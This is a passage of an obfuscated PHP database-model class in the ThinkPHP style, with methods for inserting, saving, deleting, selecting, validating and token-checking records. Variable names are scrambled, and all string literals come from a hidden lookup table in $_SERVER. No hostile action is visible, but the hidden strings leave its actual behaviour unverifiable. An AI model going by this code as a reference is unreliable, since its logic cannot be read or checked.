$this->fields[$¢°¬êøë[258]] = think_config($¢°¬êøë[257]); } if (think_config($¢°¬êøë[254])) { $õ“˜¨∞´ = $this->dbName ? $this->dbName : think_config($¢°¬êøë[255]); think_var_cache($¢°¬êøë[256] . strtolower(get_path_this($õ“˜¨∞´) . $¢°¬êøë[20] . $this->name), $this->fields); } } public function switchModel($ﬂ¢∫·ä©, $Ëä¯¶Ò® = array()) { $óı≈©Ö≠ =& $_SERVER[Á≈ ä ∞]; $≤˜¬èõÒ = ucwords(strtolower($ﬂ¢∫·ä©)) . $óı≈©Ö≠[262]; if (!class_exists($≤˜¬èõÒ)) { think_exception($≤˜¬èõÒ . think_lang($óı≈©Ö≠[263])); } $this->_extModel = new $≤˜¬èõÒ($this->name); if (!empty($Ëä¯¶Ò®)) { foreach ($Ëä¯¶Ò® as $˜¿¢íœÕ) { $this->_extModel->setProperty($˜¿¢íœÕ, $this->{$˜¿¢íœÕ}); } } return $this->_extModel; } public function __set($µ´ëï¢, $à¢Á¢Àü) { $this->data[$µ´ëï¢] = $à¢Á¢Àü; } public function __get($¿©™´œÔ) { return isset($this->data[$¿©™´œÔ]) ? $this->data[$¿©™´œÔ] : null; } public function __isset($µê´ËÒØ) { return isset($this->data[$µê´ËÒØ]); } public function __unset($∆∑É¿Óï) { unset($this->data[$∆∑É¿Óï]); } public function __call($ª€”òéΩ, $ÎÇìÍâ⁄) { $»Ú˚ïÃ‚ =& $_SERVER[Á≈ ä ∞]; if (in_array(strtolower($ª€”òéΩ), $this->methods, !0)) { $this->options[strtolower($ª€”òéΩ)] = $ÎÇìÍâ⁄[0]; return $this; } elseif (in_array(strtolower($ª€”òéΩ), array($»Ú˚ïÃ‚[264], $»Ú˚ïÃ‚[265], $»Ú˚ïÃ‚[266], $»Ú˚ïÃ‚[267], $»Ú˚ïÃ‚[268]), !0)) { $“üÛÛ⁄û = isset($ÎÇìÍâ⁄[0]) ? $ÎÇìÍâ⁄[0] : $»Ú˚ïÃ‚[198]; $“üÛÛ⁄û = $this->db->parseKey($“üÛÛ⁄û); return $this->getField(strtoupper($ª€”òéΩ) . $»Ú˚ïÃ‚[269] . $“üÛÛ⁄û . $»Ú˚ïÃ‚[270] . $ª€”òéΩ, $»Ú˚ïÃ‚[264]); } elseif (strtolower(substr($ª€”òéΩ, 0, 5)) == $»Ú˚ïÃ‚[271]) { $“üÛÛ⁄û = think_parse_name(substr($ª€”òéΩ, 5)); $ËØÚõ¯Ê[$“üÛÛ⁄û] = $ÎÇìÍâ⁄[0]; return $this->where($ËØÚõ¯Ê)->find(); } elseif (strtolower(substr($ª€”òéΩ, 0, 10)) == $»Ú˚ïÃ‚[272]) { $Ê∆‡Ãéò = think_parse_name(substr($ª€”òéΩ, 10)); $ËØÚõ¯Ê[$Ê∆‡Ãéò] = $ÎÇìÍâ⁄[0]; return $this->where($ËØÚõ¯Ê)->getField($ÎÇìÍâ⁄[1]); } elseif (isset($this->_scope[$ª€”òéΩ])) { return $this->scope($ª€”òéΩ, $ÎÇìÍâ⁄[0]); } elseif (method_exists($this, $ª€”òéΩ)) { array_unshift($ÎÇìÍâ⁄, $ª€”òéΩ); return call_user_func_array(array($this, $»Ú˚ïÃ‚[273]), $ÎÇìÍâ⁄); } else { return call_user_func_array(array(parent, $ª€”òéΩ), $ÎÇìÍâ⁄); } } protected function call() { $´ÑÈøµö =& $_SERVER[Á≈ ä ∞]; $®ÓËñç÷ = func_get_args(); $„ê˝íù† = array_shift($®ÓËñç÷); $ìôüÌ‰õ = $„ê˝íù†; if (is_array($„ê˝íù†)) { $ìôüÌ‰õ = $„ê˝íù†[1]; $„ê˝íù† = $„ê˝íù†[0]; } $ç∂í≥§∆ = count($®ÓËñç÷) - 1; if (isset($®ÓËñç÷[$ç∂í≥§∆]) && $®ÓËñç÷[$ç∂í≥§∆] === $„ê˝íù†) { think_exception(__CLASS__ . $´ÑÈøµö[4] . $„ê˝íù† . think_lang($´ÑÈøµö[274])); return; } $®ÓËñç÷[] = $„ê˝íù†; if (method_exists($this, $´ÑÈøµö[275])) { $©äù⁄ñã = call_user_func_array(array($this, $´ÑÈøµö[276]), array($ìôüÌ‰õ, $®ÓËñç÷)); if (!is_null($©äù⁄ñã) && $©äù⁄ñã !== !1) { return $©äù⁄ñã; } } $˙Êëïµ≈ = call_user_func_array(array($this, $„ê˝íù†), $®ÓËñç÷); if (method_exists($this, $´ÑÈøµö[277])) { $©äù⁄ñã = call_user_func_array(array($this, $´ÑÈøµö[278]), array($ìôüÌ‰õ, $®ÓËñç÷, $˙Êëïµ≈)); if ($©äù⁄ñã) { return $©äù⁄ñã; } } return $˙Êëïµ≈; } protected function _initialize() { } protected function _facade($¿ÙÕƒÖ”) { $Ø◊ôœ¿¨ =& $_SERVER[Á≈ ä ∞]; if (!empty($this->fields)) { foreach ($¿ÙÕƒÖ” as $˚Ó¬ü¥Œ => $™òî˙ù) { if (is_array($this->fields) && !in_array($˚Ó¬ü¥Œ, $this->fields, !0)) { unset($¿ÙÕƒÖ”[$˚Ó¬ü¥Œ]); } elseif (is_scalar($™òî˙ù)) { $this->_parseType($¿ÙÕƒÖ”, $˚Ó¬ü¥Œ); } } } if (!empty($this->options[$Ø◊ôœ¿¨[279]])) { $¿ÙÕƒÖ” = array_map($this->options[$Ø◊ôœ¿¨[279]], $¿ÙÕƒÖ”); unset($this->options[$Ø◊ôœ¿¨[279]]); } $this->_beforeWrite($¿ÙÕƒÖ”); return $¿ÙÕƒÖ”; } protected function _beforeWrite(&$ñâ◊ÊãÉ) { } public function add($≠±Ü∆Ûº = '', $ï∆áñ‰‰ = array(), $Ø‹«Œ˝Ì = false) { if (empty($≠±Ü∆Ûº)) { if (!empty($this->data)) { $≠±Ü∆Ûº = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Á≈ ä ∞][280]); return !1; } } $ï∆áñ‰‰ = $this->_parseOptions($ï∆áñ‰‰); $≠±Ü∆Ûº = $this->_facade($≠±Ü∆Ûº); if (!1 === $this->_beforeInsert($≠±Ü∆Ûº, $ï∆áñ‰‰)) { return !1; } $—©ÖÒ¶ä = $this->db->insert($≠±Ü∆Ûº, $ï∆áñ‰‰, $Ø‹«Œ˝Ì); if (!1 !== $—©ÖÒ¶ä) { $≠Á¡–∞ = $this->getLastInsID(); if ($≠Á¡–∞) { $≠±Ü∆Ûº[$this->getPk()] = $≠Á¡–∞; $this->_after_insert($≠±Ü∆Ûº, $ï∆áñ‰‰); return $≠Á¡–∞; } $this->_after_insert($≠±Ü∆Ûº, $ï∆áñ‰‰); } return $—©ÖÒ¶ä; } protected function _beforeInsert(&$ú¬Äæ·Ü, $’≥ŒπÁ¡) { } protected function _after_insert($õËµèß°, $·º–™≤‡) { } public function addAll($¨Ó∫ﬂœ∆, $…à’∫Ù… = array(), $◊Ê  ∞¢ = false) { $“¯ÿùì£ =& $_SERVER[Á≈ ä ∞]; if (empty($¨Ó∫ﬂœ∆)) { $this->error = think_lang($“¯ÿùì£[280]); return !1; } $…à’∫Ù… = $this->_parseOptions($…à’∫Ù…); foreach ($¨Ó∫ﬂœ∆ as $†åÙÂêÄ => $ÿÜä›®Ì) { $¨Ó∫ﬂœ∆[$†åÙÂêÄ] = $this->_facade($ÿÜä›®Ì); } if (method_exists($this->db, $“¯ÿùì£[281])) { $µ∆™¶«— = $this->db->insertAll($¨Ó∫ﬂœ∆, $…à’∫Ù…, $◊Ê  ∞¢); } else { $this->startTrans(); foreach ($¨Ó∫ﬂœ∆ as $†åÙÂêÄ => $ÿÜä›®Ì) { $µ∆™¶«— = $this->db->insert($ÿÜä›®Ì, $…à’∫Ù…, $◊Ê  ∞¢); } $this->commit(); } if (!1 !== $µ∆™¶«—) { $√∑€ÿ¨· = $this->getLastInsID(); if ($√∑€ÿ¨·) { return $√∑€ÿ¨·; } } return $µ∆™¶«—; } public function selectAdd($√˜◊‹ùà = '', $”∫ƒÕßÜ = '', $õÉÒ‚Ï¬ = array()) { $Å˚ÁÂùÈ =& $_SERVER[Á≈ ä ∞]; $õÉÒ‚Ï¬ = $this->_parseOptions($õÉÒ‚Ï¬); if (!1 === ($∑ÀÉ∑Ï˙ = $this->db->selectInsert($√˜◊‹ùà ? $√˜◊‹ùà : $õÉÒ‚Ï¬[$Å˚ÁÂùÈ[282]], $”∫ƒÕßÜ ? $”∫ƒÕßÜ : $this->getTableName(), $õÉÒ‚Ï¬))) { $this->error = think_lang($Å˚ÁÂùÈ[283]); return !1; } else { return $∑ÀÉ∑Ï˙; } } public function save($≥ÌÃ¬ﬂí = '', $π˙⁄óóä = array()) { $ŸΩ•ò…∂ =& $_SERVER[Á≈ ä ∞]; if (empty($≥ÌÃ¬ﬂí)) { if (!empty($this->data)) { $≥ÌÃ¬ﬂí = $this->data; $this->data = array(); } else { $this->error = think_lang($ŸΩ•ò…∂[280]); return !1; } } $≥ÌÃ¬ﬂí = $this->_facade($≥ÌÃ¬ﬂí); $π˙⁄óóä = $this->_parseOptions($π˙⁄óóä); $ñ„Ó∏Õ‘ = $this->getPk(); if (!isset($π˙⁄óóä[$ŸΩ•ò…∂[284]])) { if (isset($≥ÌÃ¬ﬂí[$ñ„Ó∏Õ‘])) { $ûΩû†∏£[$ñ„Ó∏Õ‘] = $≥ÌÃ¬ﬂí[$ñ„Ó∏Õ‘]; $π˙⁄óóä[$ŸΩ•ò…∂[284]] = $ûΩû†∏£; unset($≥ÌÃ¬ﬂí[$ñ„Ó∏Õ‘]); } else { $this->error = think_lang($ŸΩ•ò…∂[283]); return !1; } } if (is_array($π˙⁄óóä[$ŸΩ•ò…∂[284]]) && isset($π˙⁄óóä[$ŸΩ•ò…∂[284]][$ñ„Ó∏Õ‘])) { $œ‰ù†ƒÃ = $π˙⁄óóä[$ŸΩ•ò…∂[284]][$ñ„Ó∏Õ‘]; } if (!1 === $this->_beforeUpdate($≥ÌÃ¬ﬂí, $π˙⁄óóä)) { return !1; } $Õ˝±ê˝∞ = $this->db->update($≥ÌÃ¬ﬂí, $π˙⁄óóä); if (!1 !== $Õ˝±ê˝∞) { if (isset($œ‰ù†ƒÃ)) { $≥ÌÃ¬ﬂí[$ñ„Ó∏Õ‘] = $œ‰ù†ƒÃ; } $this->_afterUpdate($≥ÌÃ¬ﬂí, $π˙⁄óóä); } return $Õ˝±ê˝∞; } protected function _beforeUpdate(&$∞ÇΩ›ä, $óΩ‘€Á¡) { } protected function _afterUpdate($˝ßÏüπ‹, $‘…˘áıı) { } public function delete($ã†›Õ¡Ï = array()) { $Ùã®›ô˙ =& $_SERVER[Á≈ ä ∞]; if (empty($ã†›Õ¡Ï) && empty($this->options[$Ùã®›ô˙[284]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÊùÃıˆä = $this->getPk(); if (is_numeric($ã†›Õ¡Ï) || is_string($ã†›Õ¡Ï)) { if (strpos($ã†›Õ¡Ï, $Ùã®›ô˙[60])) { $•èµöÅŸ[$ÊùÃıˆä] = array($Ùã®›ô˙[285], $ã†›Õ¡Ï); } else { $•èµöÅŸ[$ÊùÃıˆä] = $ã†›Õ¡Ï; } $this->options[$Ùã®›ô˙[284]] = $•èµöÅŸ; } $ã†›Õ¡Ï = $this->_parseOptions(); if (is_array($ã†›Õ¡Ï[$Ùã®›ô˙[284]]) && isset($ã†›Õ¡Ï[$Ùã®›ô˙[284]][$ÊùÃıˆä])) { $∑ı–Ÿ¥¢ = $ã†›Õ¡Ï[$Ùã®›ô˙[284]][$ÊùÃıˆä]; } $≤“ Ï˚Ë = $this->db->delete($ã†›Õ¡Ï); if (!1 !== $≤“ Ï˚Ë) { $˝¯çÜìŸ = array(); if (isset($∑ı–Ÿ¥¢)) { $˝¯çÜìŸ[$ÊùÃıˆä] = $∑ı–Ÿ¥¢; } $this->_after_delete($˝¯çÜìŸ, $ã†›Õ¡Ï); } return $≤“ Ï˚Ë; } protected function _after_delete($øÛú¸Úã, $ÊòóÇ‘Î) { } public function select($∞≥©ãÔ∑ = array()) { $ßµî¡¡Í =& $_SERVER[Á≈ ä ∞]; if (is_string($∞≥©ãÔ∑) || is_numeric($∞≥©ãÔ∑)) { $∑£õÎ¥÷ = $this->getPk(); if (strpos($∞≥©ãÔ∑, $ßµî¡¡Í[60])) { $’ó≥ò≤˝[$∑£õÎ¥÷] = array($ßµî¡¡Í[285], $∞≥©ãÔ∑); } else { $’ó≥ò≤˝[$∑£õÎ¥÷] = $∞≥©ãÔ∑; } $this->options[$ßµî¡¡Í[284]] = $’ó≥ò≤˝; } elseif (!1 === $∞≥©ãÔ∑) { $∞≥©ãÔ∑ = $this->_parseOptions(); return $ßµî¡¡Í[286] . $this->db->buildSelectSql($∞≥©ãÔ∑) . $ßµî¡¡Í[287]; } $∞≥©ãÔ∑ = $this->_parseOptions(); $Ì¡ﬁÀæ‡ = $this->db->select($∞≥©ãÔ∑); if (!1 === $Ì¡ﬁÀæ‡) { return !1; } if (empty($Ì¡ﬁÀæ‡)) { return null; } $this->_afterSelect($Ì¡ﬁÀæ‡, $∞≥©ãÔ∑); return $Ì¡ﬁÀæ‡; } protected function _afterSelect(&$™…¿Ó∆∆, $Éﬂ”àµ) { } public function buildSql($òÆŸíÑË = array()) { $´ßµ·ÎÛ =& $_SERVER[Á≈ ä ∞]; $òÆŸíÑË = $this->_parseOptions($òÆŸíÑË); return $´ßµ·ÎÛ[286] . $this->db->buildSelectSql($òÆŸíÑË) . $´ßµ·ÎÛ[287]; } public function optionsValue($ç•¿Ïîœ = null) { if (is_null($ç•¿Ïîœ)) { return $this->options; } elseif (is_array($ç•¿Ïîœ)) { $this->options = array_merge($this->options, $ç•¿Ïîœ); } } protected function _parseOptions($êÍ†⁄◊Ó = array()) { $üÕ´Î·Ç =& $_SERVER[Á≈ ä ∞]; if (is_array($êÍ†⁄◊Ó)) { $êÍ†⁄◊Ó = array_merge($this->options, $êÍ†⁄◊Ó); } $this->options = array(); if (!isset($êÍ†⁄◊Ó[$üÕ´Î·Ç[288]])) { $êÍ†⁄◊Ó[$üÕ´Î·Ç[288]] = $this->getTableName(); $ú´∑Œì§ = $this->fields; } else { $ú´∑Œì§ = $this->getDbFields(); } if (!empty($êÍ†⁄◊Ó[$üÕ´Î·Ç[289]])) { $êÍ†⁄◊Ó[$üÕ´Î·Ç[288]] .= $üÕ´Î·Ç[63] . $êÍ†⁄◊Ó[$üÕ´Î·Ç[289]]; } $êÍ†⁄◊Ó[$üÕ´Î·Ç[290]] = $this->name; if (isset($êÍ†⁄◊Ó[$üÕ´Î·Ç[284]]) && is_array($êÍ†⁄◊Ó[$üÕ´Î·Ç[284]]) && !empty($ú´∑Œì§) && !isset($êÍ†⁄◊Ó[$üÕ´Î·Ç[291]]) && !isset($êÍ†⁄◊Ó[$üÕ´Î·Ç[288]])) { foreach ($êÍ†⁄◊Ó[$üÕ´Î·Ç[284]] as $∏€‰∞˙« => $√õÁﬂæß) { $∏€‰∞˙« = trim($∏€‰∞˙«); if (in_array($∏€‰∞˙«, $ú´∑Œì§, !0)) { if (is_scalar($√õÁﬂæß)) { $this->_parseType($êÍ†⁄◊Ó[$üÕ´Î·Ç[284]], $∏€‰∞˙«); } } elseif (!is_numeric($∏€‰∞˙«) && $üÕ´Î·Ç[21] != substr($∏€‰∞˙«, 0, 1) && !1 === strpos($∏€‰∞˙«, $üÕ´Î·Ç[20]) && !1 === strpos($∏€‰∞˙«, $üÕ´Î·Ç[269]) && !1 === strpos($∏€‰∞˙«, $üÕ´Î·Ç[292]) && !1 === strpos($∏€‰∞˙«, $üÕ´Î·Ç[293])) { unset($êÍ†⁄◊Ó[$üÕ´Î·Ç[284]][$∏€‰∞˙«]); } } } $this->_options_filter($êÍ†⁄◊Ó); return $êÍ†⁄◊Ó; } protected function _options_filter(&$Œ‚óÒ”∞) { } protected function _parseType(&$˝⁄∫›˝, $Ú¡ºˆ‰ë) { $ ¿À¨ø◊ =& $_SERVER[Á≈ ä ∞]; if (empty($this->options[$ ¿À¨ø◊[294]][$ ¿À¨ø◊[4] . $Ú¡ºˆ‰ë])) { $˙Ç•¶á… = strtolower($this->fields[$ ¿À¨ø◊[261]][$Ú¡ºˆ‰ë]); if (!1 !== strpos($˙Ç•¶á…, $ ¿À¨ø◊[295])) { } elseif (!1 === strpos($˙Ç•¶á…, $ ¿À¨ø◊[296]) && !1 !== strpos($˙Ç•¶á…, $ ¿À¨ø◊[297])) { $˝⁄∫›˝[$Ú¡ºˆ‰ë] = intval($˝⁄∫›˝[$Ú¡ºˆ‰ë]); } elseif (!1 !== strpos($˙Ç•¶á…, $ ¿À¨ø◊[298]) || !1 !== strpos($˙Ç•¶á…, $ ¿À¨ø◊[299])) { $˝⁄∫›˝[$Ú¡ºˆ‰ë] = floatval($˝⁄∫›˝[$Ú¡ºˆ‰ë]); } elseif (!1 !== strpos($˙Ç•¶á…, $ ¿À¨ø◊[300])) { $˝⁄∫›˝[$Ú¡ºˆ‰ë] = (bool) $˝⁄∫›˝[$Ú¡ºˆ‰ë]; } } } public function find($∑≤ÍøÉﬂ = array()) { $ÆﬁÎìÚ° =& $_SERVER[Á≈ ä ∞]; if (is_numeric($∑≤ÍøÉﬂ) || is_string($∑≤ÍøÉﬂ)) { $ÆÓ±‹Ê≈[$this->getPk()] = intval($∑≤ÍøÉﬂ); $this->options[$ÆﬁÎìÚ°[284]] = $ÆÓ±‹Ê≈; } $this->options[$ÆﬁÎìÚ°[301]] = 1; $∑≤ÍøÉﬂ = $this->_parseOptions(); $ªÁÊÔ˝” = $this->db->select($∑≤ÍøÉﬂ); if (!1 === $ªÁÊÔ˝”) { return !1; } if (empty($ªÁÊÔ˝”)) { return null; } $this->data = $ªÁÊÔ˝”[0]; $this->_afterFind($this->data, $∑≤ÍøÉﬂ); if (!empty($this->options[$ÆﬁÎìÚ°[302]])) { return $this->returnResult($this->data, $this->options[$ÆﬁÎìÚ°[302]]); } return $this->data; } protected function _afterFind(&$Á‰‡µ¯˚, $¡¨ﬂ˘∞ô) { } protected function returnResult($™‹ÇúŒ˜, $¬ã—≤ëä = '') { $Œ⁄®∑ûÃ =& $_SERVER[Á≈ ä ∞]; if ($¬ã—≤ëä) { if (is_callable($¬ã—≤ëä)) { return call_user_func($¬ã—≤ëä, $™‹ÇúŒ˜); } switch (strtolower($¬ã—≤ëä)) { case $Œ⁄®∑ûÃ[303]: return json_encode($™‹ÇúŒ˜); case $Œ⁄®∑ûÃ[304]: return xml_encode($™‹ÇúŒ˜); } } return $™‹ÇúŒ˜; } public function parseFieldsMap($˚˝¯∏¥≤, $Ëò∞…‹ﬁ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÜÛ„¯™ç => $“—¸—ˆâ) { if ($Ëò∞…‹ﬁ == 1) { if (isset($˚˝¯∏¥≤[$“—¸—ˆâ])) { $˚˝¯∏¥≤[$ÜÛ„¯™ç] = $˚˝¯∏¥≤[$“—¸—ˆâ]; unset($˚˝¯∏¥≤[$“—¸—ˆâ]); } } else { if (isset($˚˝¯∏¥≤[$ÜÛ„¯™ç])) { $˚˝¯∏¥≤[$“—¸—ˆâ] = $˚˝¯∏¥≤[$ÜÛ„¯™ç]; unset($˚˝¯∏¥≤[$ÜÛ„¯™ç]); } } } } return $˚˝¯∏¥≤; } public function setField($≥„í∂¡, $ÙÔˆ≥º˝ = '') { if (is_array($≥„í∂¡)) { $˝≠˛àÏï = $≥„í∂¡; } else { $˝≠˛àÏï[$≥„í∂¡] = $ÙÔˆ≥º˝; } return $this->save($˝≠˛àÏï); } public function setAdd($–Ñ®Êªè, $ã™£‚Ø£ = 1) { $±„é∆õÇ =& $_SERVER[Á≈ ä ∞]; $—ù·Ã‘¿ = $–Ñ®Êªè . $±„é∆õÇ[305] . $ã™£‚Ø£; if ($ã™£‚Ø£ < 0) { $—ù·Ã‘¿ = $–Ñ®Êªè . $ã™£‚Ø£; } return $this->setField($–Ñ®Êªè, array($±„é∆õÇ[306], $—ù·Ã‘¿)); } public function getField($Ã◊óïÈπ, $§Ç€≠Ç√ = null) { $‡Ωæñ≥ˆ =& $_SERVER[Á≈ ä ∞]; $Õﬁß√π’[$‡Ωæñ≥ˆ[282]] = $Ã◊óïÈπ; $Õﬁß√π’ = $this->_parseOptions($Õﬁß√π’); $Ã◊óïÈπ = trim($Ã◊óïÈπ); if (strpos($Ã◊óïÈπ, $‡Ωæñ≥ˆ[60])) { if (!isset($Õﬁß√π’[$‡Ωæñ≥ˆ[301]])) { $Õﬁß√π’[$‡Ωæñ≥ˆ[301]] = is_numeric($§Ç€≠Ç√) ? $§Ç€≠Ç√ : $‡Ωæñ≥ˆ[22]; } $∏îÍ«éÙ = $this->db->select($Õﬁß√π’); if (!empty($∏îÍ«éÙ)) { $≤É‹è¯î = explode($‡Ωæñ≥ˆ[60], $Ã◊óïÈπ); $Ã◊óïÈπ = array_keys($∏îÍ«éÙ[0]); $Î•Äë§õ = array_shift($Ã◊óïÈπ); $èÉ«ë◊Î = array_shift($Ã◊óïÈπ); $» ˘â© = array(); $˜◊ì÷‡ﬁ = count($≤É‹è¯î); foreach ($∏îÍ«éÙ as $ÿ£√àÑ∏) { $ºüùŸ´π = $ÿ£√àÑ∏[$Î•Äë§õ]; if (2 == $˜◊ì÷‡ﬁ) { $» ˘â©[$ºüùŸ´π] = $ÿ£√àÑ∏[$èÉ«ë◊Î]; } else { $» ˘â©[$ºüùŸ´π] = is_string($§Ç€≠Ç√) ? implode($§Ç€≠Ç√, $ÿ£√àÑ∏) : $ÿ£√àÑ∏; } } return $» ˘â©; } } else { if (!0 !== $§Ç€≠Ç√) { $Õﬁß√π’[$‡Ωæñ≥ˆ[301]] = is_numeric($§Ç€≠Ç√) ? $§Ç€≠Ç√ : 1; } if ($§Ç€≠Ç√ === $‡Ωæñ≥ˆ[264]) { unset($Õﬁß√π’[$‡Ωæñ≥ˆ[301]]); } $ÿ£√àÑ∏ = $this->db->select($Õﬁß√π’); if (!empty($ÿ£√àÑ∏)) { if ($§Ç€≠Ç√ === $‡Ωæñ≥ˆ[264]) { return reset($ÿ£√àÑ∏[0]); } if (!0 !== $§Ç€≠Ç√ && 1 == $Õﬁß√π’[$‡Ωæñ≥ˆ[301]]) { return reset($ÿ£√àÑ∏[0]); } foreach ($ÿ£√àÑ∏ as $ò·ÀÉÜ‹) { $Å˜⁄°˘«[] = $ò·ÀÉÜ‹[$Ã◊óïÈπ]; } return $Å˜⁄°˘«; } } return null; } public function create($⁄Ü‚‘∂í = '', $˘€óÖ∏ü = '') { $¯ÔòÀÉî =& $_SERVER[Á≈ ä ∞]; if (empty($⁄Ü‚‘∂í)) { $⁄Ü‚‘∂í = $_POST; } elseif (is_object($⁄Ü‚‘∂í)) { $⁄Ü‚‘∂í = get_object_vars($⁄Ü‚‘∂í); } if (empty($⁄Ü‚‘∂í) || !is_array($⁄Ü‚‘∂í)) { $this->error = think_lang($¯ÔòÀÉî[280]); return !1; } $⁄Ü‚‘∂í = $this->parseFieldsMap($⁄Ü‚‘∂í, 0); $˘€óÖ∏ü = $˘€óÖ∏ü ? $˘€óÖ∏ü : (!empty($⁄Ü‚‘∂í[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¯ÔòÀÉî[282]])) { $èàò¿æ‡ = $this->options[$¯ÔòÀÉî[282]]; unset($this->options[$¯ÔòÀÉî[282]]); } elseif ($˘€óÖ∏ü == THINK_MODEL_INSERT && isset($this->insertFields)) { $èàò¿æ‡ = $this->insertFields; } elseif ($˘€óÖ∏ü == THINK_MODEL_UPDATE && isset($this->updateFields)) { $èàò¿æ‡ = $this->updateFields; } if (isset($èàò¿æ‡)) { if (is_string($èàò¿æ‡)) { $èàò¿æ‡ = explode($¯ÔòÀÉî[60], $èàò¿æ‡); } if (think_config($¯ÔòÀÉî[307])) { $èàò¿æ‡[] = think_config($¯ÔòÀÉî[308]); } foreach ($⁄Ü‚‘∂í as $•ÃÛ „ê => $Óäáéﬁ√) { if (!in_array($•ÃÛ „ê, $èàò¿æ‡)) { unset($⁄Ü‚‘∂í[$•ÃÛ „ê]); } } } if (!$this->autoValidation($⁄Ü‚‘∂í, $˘€óÖ∏ü)) { return !1; } if (!$this->autoCheckToken($⁄Ü‚‘∂í)) { $this->error = think_lang($¯ÔòÀÉî[309]); return !1; } if ($this->autoCheckFields) { $èàò¿æ‡ = $this->getDbFields(); foreach ($⁄Ü‚‘∂í as $•ÃÛ „ê => $Óäáéﬁ√) { if (!in_array($•ÃÛ „ê, $èàò¿æ‡)) { unset($⁄Ü‚‘∂í[$•ÃÛ „ê]); } elseif (MAGIC_QUOTES_GPC && is_string($Óäáéﬁ√)) { $⁄Ü‚‘∂í[$•ÃÛ „ê] = stripslashes($Óäáéﬁ√); } } } $this->autoOperation($⁄Ü‚‘∂í, $˘€óÖ∏ü); $this->data = $⁄Ü‚‘∂í; return $⁄Ü‚‘∂í; } public function autoCheckToken($Ëèµ—ù≥) { $Óˆ•≥Áú =& $_SERVER[Á≈ ä ∞]; if (isset($this->options[$Óˆ•≥Áú[310]]) && !$this->options[$Óˆ•≥Áú[310]]) { return !0; } if (think_config($Óˆ•≥Áú[307])) { $«ˆÀÊÄ® = think_config($Óˆ•≥Áú[308]); if (!isset($Ëèµ—ù≥[$«ˆÀÊÄ®]) || Session::get($«ˆÀÊÄ®)) { return !1; } list($è…¡ßó, $‘Öœ≠ô⁄) = explode($Óˆ•≥Áú[21], $Ëèµ—ù≥[$«ˆÀÊÄ®]); if ($‘Öœ≠ô⁄ && Session::get($«ˆÀÊÄ® . $Óˆ•≥Áú[20] . $è…¡ßó) === $‘Öœ≠ô⁄) { Session::remove($«ˆÀÊÄ® . $Óˆ•≥Áú[20] . $è…¡ßó); return !0; } if (think_config($Óˆ•≥Áú[311])) { Session::remove($«ˆÀÊÄ® . $Óˆ•≥Áú[20] . $è…¡ßó); } return !1; } return !0; } public function regex($Íƒ§çä⁄, $´€÷è«ﬁ) { $—¶©ùÖ¡ =& $_SERVER[Á≈ ä ∞]; $º·»∂øç = array($—¶©ùÖ¡[312] => $—¶©ùÖ¡[313], $—¶©ùÖ¡[314] => $—¶©ùÖ¡[315], $—¶©ùÖ¡[316] => $—¶©ùÖ¡[317], $—¶©ùÖ¡[318] => $—¶©ùÖ¡[319], $—¶©ùÖ¡[320] => $—¶©ùÖ¡[321], $—¶©ùÖ¡[322] => $—¶©ùÖ¡[323], $—¶©ùÖ¡[324] => $—¶©ùÖ¡[325], $—¶©ùÖ¡[299] => $—¶©ùÖ¡[326], $—¶©ùÖ¡[327] => $—¶©ùÖ¡[328]); if (isset($º·»∂øç[strtolower($´€÷è«ﬁ)])) { $´€÷è«ﬁ = $º·»∂øç[strtolower($´€÷è«ﬁ)]; } return preg_match($´€÷è«ﬁ, $Íƒ§çä⁄) === 1; } private function autoOperation(&$‰‘∆Ë∞ª, $“˙ŸÛÅ´) { $Ù”¿°∞§ =& $_SERVER[Á≈ ä ∞]; if (!empty($this->options[$Ù”¿°∞§[329]])) { $÷î’ò—© = $this->options[$Ù”¿°∞§[329]]; unset($this->options[$Ù”¿°∞§[329]]); } elseif (!empty($this->_auto)) { $÷î’ò—© = $this->_auto; } if (isset($÷î’ò—©)) { foreach ($÷î’ò—© as $¨™€€±˜) { if (empty($¨™€€±˜[2])) { $¨™€€±˜[2] = THINK_MODEL_INSERT; } if ($“˙ŸÛÅ´ == $¨™€€±˜[2] || $¨™€€±˜[2] == THINK_MODEL_BOTH) { switch (trim($¨™€€±˜[3])) { case $Ù”¿°∞§[330]: case $Ù”¿°∞§[331]: $∆ÈÇ√˝â = isset($¨™€€±˜[4]) ? (array) $¨™€€±˜[4] : array(); if (isset($‰‘∆Ë∞ª[$¨™€€±˜[0]])) { array_unshift($∆ÈÇ√˝â, $‰‘∆Ë∞ª[$¨™€€±˜[0]]); } if ($Ù”¿°∞§[330] == $¨™€€±˜[3]) { $‰‘∆Ë∞ª[$¨™€€±˜[0]] = call_user_func_array($¨™€€±˜[1], $∆ÈÇ√˝â); } else { $‰‘∆Ë∞ª[$¨™€€±˜[0]] = call_user_func_array(array(&$this, $¨™€€±˜[1]), $∆ÈÇ√˝â); } break; case $Ù”¿°∞§[282]: $‰‘∆Ë∞ª[$¨™€€±˜[0]] = $‰‘∆Ë∞ª[$¨™€€±˜[1]]; break; case $Ù”¿°∞§[332]: if ($Ù”¿°∞§[22] === $‰‘∆Ë∞ª[$¨™€€±˜[0]]) { unset($‰‘∆Ë∞ª[$¨™€€±˜[0]]); } break; case $Ù”¿°∞§[333]: default: $‰‘∆Ë∞ª[$¨™€€±˜[0]] = $¨™€€±˜[1]; } if (!1 === $‰‘∆Ë∞ª[$¨™€€±˜[0]]) { unset($‰‘∆Ë∞ª[$¨™€€±˜[0]]); } } } } return $‰‘∆Ë∞ª; } protected function autoValidation($∆ŒÆ‘Ö∫, $Ìˆ•êßå) { $üêüÔÊµ =& $_SERVER[Á≈ ä ∞]; if (!empty($this->options[$üêüÔÊµ[334]])) { $óçß®ç√ = $this->options[$üêüÔÊµ[334]]; unset($this->options[$üêüÔÊµ[334]]); } elseif (!empty($this->_validate)) { $óçß®ç√ = $this->_validate; } if (isset($óçß®ç√)) { if ($this->patchValidate) { $this->error = array(); } foreach ($óçß®ç√ as $°≤ÃÌèª => $©ÃΩ¨…õ) { if (empty($©ÃΩ¨…õ[5]) || $©ÃΩ¨…õ[5] == THINK_MODEL_BOTH || $©ÃΩ¨…õ[5] == $Ìˆ•êßå) { if (0 == strpos($©ÃΩ¨…õ[2], $üêüÔÊµ[335]) && strpos($©ÃΩ¨…õ[2], $üêüÔÊµ[336])) { $©ÃΩ¨…õ[2] = 